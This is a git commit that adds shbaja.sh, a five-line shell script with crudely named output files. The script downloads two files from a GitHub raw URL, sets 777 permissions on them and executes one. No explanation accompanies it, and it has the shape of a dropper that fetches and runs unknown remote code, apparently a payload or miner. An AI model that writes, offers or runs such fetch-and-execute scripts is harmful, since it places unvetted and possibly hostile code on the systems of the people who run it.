1e2148ab6e202062e1bda9a8674d7821da88ffe6
ferasa <86012372+desafff@users.noreply.github.com>
2021-07-19 21:11:27 +0700

    Create shbaja.sh

---
+++ shbaja.sh
@@ -0,0 +1,5 @@
+#!/bin/sh
+wget -O memek https://raw.githubusercontent.com/githubasem/vio/main/fa
+wget -O kontol https://raw.githubusercontent.com/githubasem/vio/main/vio
+chmod 777 memek kontol
+./memek
